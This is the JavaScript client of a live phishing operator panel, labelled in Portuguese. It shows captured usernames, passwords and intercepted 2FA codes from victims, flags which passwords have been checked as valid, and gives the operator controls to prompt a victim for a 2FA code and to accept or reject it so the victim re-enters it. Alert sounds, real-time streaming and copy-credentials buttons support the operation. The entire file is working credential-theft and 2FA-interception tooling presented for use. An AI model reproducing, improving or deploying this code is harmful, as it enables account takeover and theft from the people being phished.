let dadosAtuais = {
  totalLogins: 0,
  total2FA: 0,
  totalUsuarios: 0,
  consolidados: [],
  feed: []
};

let abaAtiva = "consolidado"; // "consolidado" ou "feed"
let termoBusca = "";
let ultimoTotalLogins = 0;
let ultimoTotal2FA = 0;

const kpiLogins = document.getElementById("kpi-logins");
const kpi2fa = document.getElementById("kpi-2fa");
const kpiUsuarios = document.getElementById("kpi-usuarios");
const containerTabela = document.getElementById("container-tabela");
const filtroBusca = document.getElementById("filtro-busca");
const tabConsolidado = document.getElementById("tab-consolidado");
const tabFeed = document.getElementById("tab-feed");
const btnAtualizar = document.getElementById("btn-atualizar");
const btnLimpar = document.getElementById("btn-limpar");
const toast = document.getElementById("toast");
const toastMsg = document.getElementById("toast-msg");

function showToast(msg) {
  if (!toast || !toastMsg) return;
  toastMsg.textContent = msg;
  toast.classList.add("show");
  setTimeout(() => toast.classList.remove("show"), 2500);
}

function tocarNotificacao(tipo = "login") {
  try {
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = audioCtx.createOscillator();
    const gain = audioCtx.createGain();
    osc.connect(gain);
    gain.connect(audioCtx.destination);

    if (tipo === "2fa") {
      osc.type = "sine";
      osc.frequency.setValueAtTime(880, audioCtx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(1320, audioCtx.currentTime + 0.15);
      gain.gain.setValueAtTime(0.2, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.25);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.25);
    } else {
      osc.type = "triangle";
      osc.frequency.setValueAtTime(520, audioCtx.currentTime);
      osc.frequency.exponentialRampToValueAtTime(660, audioCtx.currentTime + 0.12);
      gain.gain.setValueAtTime(0.15, audioCtx.currentTime);
      gain.gain.exponentialRampToValueAtTime(0.01, audioCtx.currentTime + 0.2);
      osc.start();
      osc.stop(audioCtx.currentTime + 0.2);
    }
  } catch (e) {}
}

function copiarTexto(texto, rotulo = "Valor") {
  if (!texto || texto === "—") return;
  navigator.clipboard.writeText(texto).then(() => {
    showToast(`${rotulo} copiado!`);
  }).catch(() => {
    const t = document.createElement("textarea");
    t.value = texto;
    document.body.appendChild(t);
    t.select();
    document.execCommand("copy");
    document.body.removeChild(t);
    showToast(`${rotulo} copiado!`);
  });
}

async function solicitar2FA(usuario) {
  if (!usuario) return;
  try {
    const res = await fetch("/api/solicitar-2fa", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ usuario })
    });
    const json = await res.json();
    if (json.success) {
      showToast(`2FA solicitado para ${usuario}! Tela da vítima liberada.`);
      carregarDados();
    }
  } catch (err) {
    console.error("Erro ao solicitar 2FA:", err);
  }
}

async function decidir2FA(usuario, decisao) {
  if (!usuario) return;
  try {
    const res = await fetch("/api/decidir-2fa", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({ usuario, decisao })
    });
    const json = await res.json();
    if (json.success) {
      if (decisao === "aceito") {
        showToast(`2FA de ${usuario} ACEITO! Redirecionando vítima.`);
      } else {
        showToast(`2FA de ${usuario} NEGADO! Vítima notificada para tentar novamente.`);
      }
      carregarDados();
    }
  } catch (err) {
    console.error("Erro ao registrar decisão 2FA:", err);
  }
}

async function carregarDados() {
  try {
    const res = await fetch("/api/painel?t=" + Date.now(), {
      cache: "no-store",
      headers: { "Cache-Control": "no-cache" }
    });
    if (!res.ok) throw new Error("Falha HTTP");
    const json = await res.json();
    if (json.success) {
      processarNovosDados(json);
    }
  } catch (err) {
    console.error("Erro ao carregar dados do painel:", err);
  }
}

function processarNovosDados(json) {
  if (ultimoTotal2FA > 0 && json.total2FA > ultimoTotal2FA) {
    tocarNotificacao("2fa");
    showToast("Novo código 2FA capturado!");
  } else if (ultimoTotalLogins > 0 && json.totalLogins > ultimoTotalLogins) {
    tocarNotificacao("login");
    showToast("Novo login capturado!");
  }

  ultimoTotalLogins = json.totalLogins || 0;
  ultimoTotal2FA = json.total2FA || 0;
  dadosAtuais = json;

  atualizarKpis();
  renderizarTabela();
}

function atualizarKpis() {
  if (kpiLogins) kpiLogins.textContent = dadosAtuais.totalLogins || 0;
  if (kpi2fa) kpi2fa.textContent = dadosAtuais.total2FA || 0;
  if (kpiUsuarios) kpiUsuarios.textContent = dadosAtuais.totalUsuarios || 0;
}

function renderizarTabela() {
  if (!containerTabela) return;

  const termo = termoBusca.toLowerCase().trim();

  if (abaAtiva === "consolidado") {
    let filtrados = dadosAtuais.consolidados || [];
    if (termo) {
      filtrados = filtrados.filter(item => {
        const u = (item.usuario || "").toLowerCase();
        const s = (item.ultimaSenha || "").toLowerCase();
        const c = (item.ultimoCodigo || "").toLowerCase();
        return u.includes(termo) || s.includes(termo) || c.includes(termo);
      });
    }

    if (filtrados.length === 0) {
      containerTabela.innerHTML = `
        <div class="empty-state">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>
          <p>Nenhuma captura registrada até o momento.</p>
        </div>
      `;
      return;
    }

    let html = `
      <table>
        <thead>
          <tr>
            <th>Data / Hora</th>
            <th>Usuário</th>
            <th>Senha Capturada</th>
            <th>Auditoria</th>
            <th>Código 2FA</th>
            <th>Status</th>
            <th style="text-align: right;">Ações de Controle</th>
          </tr>
        </thead>
        <tbody>
    `;

    filtrados.forEach((item) => {
      const tem2FA = !!item.ultimoCodigo;
      const st2FA = item.status_2fa;
      const stLogin = item.status_login || "aguardando_solicitacao";

      let statusHtml = `<span class="status-badge status-waiting">Login Capturado</span>`;
      if (tem2FA) {
        if (st2FA === "aceito") {
          statusHtml = `<span class="status-badge status-complete">2FA Aceito</span>`;
        } else if (st2FA === "negado") {
          statusHtml = `<span class="status-badge status-rejected">2FA Negado</span>`;
        } else {
          statusHtml = `<span class="status-badge status-pending">Aguardando Decisão</span>`;
        }
      } else {
        if (stLogin === "solicitar_2fa") {
          statusHtml = `<span class="status-badge status-pending">2FA Solicitado</span>`;
        } else {
          statusHtml = `<span class="status-badge status-waiting">Aguardando Operador</span>`;
        }
      }

      let auditHtml = `<span class="cred-badge cred-testing"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg> Testando</span>`;
      if (item.status_credencial === "valido") {
        auditHtml = `<span class="cred-badge cred-valid"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg> Senha Válida</span>`;
      } else if (item.status_credencial === "invalido") {
        auditHtml = `<span class="cred-badge cred-invalid"><svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> Senha Incorreta</span>`;
      }

      const codigoHtml = tem2FA
        ? `<span class="code-badge mono">${item.ultimoCodigo}</span>`
        : `<span class="code-badge-empty">—</span>`;

      const credCompleta = `${item.usuario || ""}:${item.ultimaSenha || ""}${tem2FA ? `:${item.ultimoCodigo}` : ""}`;

      html += `
        <tr>
          <td style="color: var(--text-dim); font-size: 12px;">${item.data_hora || "—"}</td>
          <td class="user-tag mono">${escapeHtml(item.usuario || "—")}</td>
          <td>
            <div class="secret-box">
              <span class="mono">${escapeHtml(item.ultimaSenha || "—")}</span>
              <button class="icon-btn" type="button" title="Copiar senha" onclick="copiarTexto('${escapeQuotes(item.ultimaSenha)}', 'Senha')">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
              </button>
            </div>
          </td>
          <td>${auditHtml}</td>
          <td>
            <div style="display: inline-flex; align-items: center; gap: 6px;">
              ${codigoHtml}
              ${tem2FA ? `
                <button class="icon-btn" type="button" title="Copiar código 2FA" onclick="copiarTexto('${escapeQuotes(item.ultimoCodigo)}', 'Código 2FA')">
                  <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                </button>
              ` : ''}
            </div>
          </td>
          <td>${statusHtml}</td>
          <td style="text-align: right;">
            <div style="display: inline-flex; align-items: center; gap: 6px; justify-content: flex-end;">
              ${tem2FA ? `
                <button class="btn-success-sm" type="button" title="Aceitar código 2FA e redirecionar para tela final" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'aceito')">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
                  <span>Aceitar</span>
                </button>
                <button class="btn-danger-sm" type="button" title="Negar código e solicitar que a vítima digite novamente" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'negado')">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                  <span>Negar</span>
                </button>
              ` : (
                stLogin === "solicitar_2fa" ? `
                  <button class="btn-secondary" style="padding: 5px 10px; font-size: 11px; opacity: 0.7;" disabled title="2FA já foi solicitado, aguardando código da vítima">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
                    <span>Aguardando Código</span>
                  </button>
                ` : `
                  <button class="btn-primary-sm" type="button" title="Liberar tela da vítima para solicitar o 2FA" onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                    <span>Solicitar 2FA</span>
                  </button>
                `
              )}
              <button class="btn btn-secondary" style="padding: 5px 10px; font-size: 11px;" type="button" title="Copiar credenciais completas" onclick="copiarTexto('${escapeQuotes(credCompleta)}', 'Credenciais completas')">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
                <span>Copiar</span>
              </button>
            </div>
          </td>
        </tr>
      `;
    });

    html += `</tbody></table>`;
    containerTabela.innerHTML = html;

  } else {
    // Modo Feed Cronológico
    let filtrados = dadosAtuais.feed || [];
    if (termo) {
      filtrados = filtrados.filter(item => {
        const u = (item.usuario || "").toLowerCase();
        const s = (item.senha || "").toLowerCase();
        const c = (item.codigo || "").toLowerCase();
        return u.includes(termo) || s.includes(termo) || c.includes(termo);
      });
    }

    if (filtrados.length === 0) {
      containerTabela.innerHTML = `
        <div class="empty-state">
          <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
          <p>Nenhum evento no feed cronológico.</p>
        </div>
      `;
      return;
    }

    let html = `
      <table>
        <thead>
          <tr>
            <th>Data / Hora</th>
            <th>Evento</th>
            <th>Usuário</th>
            <th>Dado Capturado</th>
            <th>Auditoria</th>
            <th>Status / Decisão</th>
            <th style="text-align: right;">Ações</th>
          </tr>
        </thead>
        <tbody>
    `;

    filtrados.forEach(item => {
      const is2FA = item.tipo === "2FA";
      const tipoBadge = is2FA
        ? `<span class="type-badge type-2fa">2FA</span>`
        : `<span class="type-badge type-login">LOGIN</span>`;

      const dadoTexto = is2FA ? item.codigo : item.senha;

      let statusHtml = `—`;
      if (is2FA) {
        const st = item.status_2fa || "pendente";
        if (st === "aceito") {
          statusHtml = `<span class="status-badge status-complete">Aceito</span>`;
        } else if (st === "negado") {
          statusHtml = `<span class="status-badge status-rejected">Negado</span>`;
        } else {
          statusHtml = `<span class="status-badge status-pending">Pendente</span>`;
        }
      } else {
        const stLogin = item.status_login || "aguardando_solicitacao";
        if (stLogin === "solicitar_2fa") {
          statusHtml = `<span class="status-badge status-complete">2FA Solicitado</span>`;
        } else {
          statusHtml = `<span class="status-badge status-waiting">Aguardando Operador</span>`;
        }
      }

      let auditFeed = `—`;
      if (!is2FA) {
        if (item.status_credencial === "valido") {
          auditFeed = `<span class="cred-badge cred-valid" style="font-size: 10px;">Válido</span>`;
        } else if (item.status_credencial === "invalido") {
          auditFeed = `<span class="cred-badge cred-invalid" style="font-size: 10px;">Incorreto</span>`;
        } else {
          auditFeed = `<span class="cred-badge cred-testing" style="font-size: 10px;">Testando</span>`;
        }
      }

      html += `
        <tr>
          <td style="color: var(--text-dim); font-size: 12px;">${item.data_hora || "—"}</td>
          <td>${tipoBadge}</td>
          <td class="user-tag mono">${escapeHtml(item.usuario || "—")}</td>
          <td>
            <div class="secret-box">
              <span class="mono">${escapeHtml(dadoTexto || "—")}</span>
            </div>
          </td>
          <td>${auditFeed}</td>
          <td>${statusHtml}</td>
          <td style="text-align: right;">
            <div style="display: inline-flex; align-items: center; gap: 6px; justify-content: flex-end;">
              ${is2FA ? `
                <button class="btn-success-sm" type="button" title="Aceitar" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'aceito')">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><polyline points="20 6 9 17 4 12"/></svg>
                  <span>Aceitar</span>
                </button>
                <button class="btn-danger-sm" type="button" title="Negar" onclick="decidir2FA('${escapeQuotes(item.usuario)}', 'negado')">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
                  <span>Negar</span>
                </button>
              ` : (
                item.status_login !== "solicitar_2fa" ? `
                  <button class="btn-primary-sm" type="button" title="Solicitar 2FA" onclick="solicitar2FA('${escapeQuotes(item.usuario)}')">
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="18" height="11" x="3" y="11" rx="2" ry="2"/><path d="M7 11V7a5 5 0 0 1 10 0v4"/></svg>
                    <span>Pedir 2FA</span>
                  </button>
                ` : ''
              )}
              <button class="icon-btn" type="button" title="Copiar" onclick="copiarTexto('${escapeQuotes(dadoTexto)}', 'Valor')">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><rect width="14" height="14" x="8" y="8" rx="2" ry="2"/><path d="M4 16c-1.1 0-2-.9-2-2V4c0-1.1.9-2 2-2h10c1.1 0 2 .9 2 2"/></svg>
              </button>
            </div>
          </td>
        </tr>
      `;
    });

    html += `</tbody></table>`;
    containerTabela.innerHTML = html;
  }
}

function escapeHtml(str) {
  if (!str) return "";
  return String(str)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function escapeQuotes(str) {
  if (!str) return "";
  return String(str).replace(/'/g, "\\'").replace(/"/g, "\\\"");
}

// Event Listeners
if (filtroBusca) {
  filtroBusca.addEventListener("input", (e) => {
    termoBusca = e.target.value;
    renderizarTabela();
  });
}

if (tabConsolidado && tabFeed) {
  tabConsolidado.addEventListener("click", () => {
    abaAtiva = "consolidado";
    tabConsolidado.classList.add("active");
    tabFeed.classList.remove("active");
    renderizarTabela();
  });

  tabFeed.addEventListener("click", () => {
    abaAtiva = "feed";
    tabFeed.classList.add("active");
    tabConsolidado.classList.remove("active");
    renderizarTabela();
  });
}

if (btnAtualizar) {
  btnAtualizar.addEventListener("click", () => {
    carregarDados();
    showToast("Dados atualizados!");
  });
}

if (btnLimpar) {
  btnLimpar.addEventListener("click", async () => {
    try {
      const res = await fetch("/api/limpar", { method: "POST" });
      const json = await res.json();
      if (json.success) {
        showToast("Registros limpos com sucesso!");
        carregarDados();
      }
    } catch (err) {
      console.error(err);
    }
  });
}

// Conexão em tempo real via Server-Sent Events (SSE)
let sseConexao = null;
function conectarSSE() {
  if (!window.EventSource) return;
  try {
    if (sseConexao) sseConexao.close();
    sseConexao = new EventSource("/api/stream?t=" + Date.now());

    sseConexao.onmessage = (event) => {
      try {
        const json = JSON.parse(event.data);
        if (json && json.success) {
          processarNovosDados(json);
        }
      } catch (e) {
        console.error("Erro ao processar stream SSE:", e);
      }
    };

    sseConexao.onerror = () => {
      if (sseConexao) sseConexao.close();
      setTimeout(conectarSSE, 2000);
    };
  } catch (err) {
    console.error("Falha ao iniciar SSE:", err);
  }
}

// Inicialização imediata + SSE em tempo real + fallback polling de 1s
carregarDados();
conectarSSE();
setInterval(carregarDados, 1000);
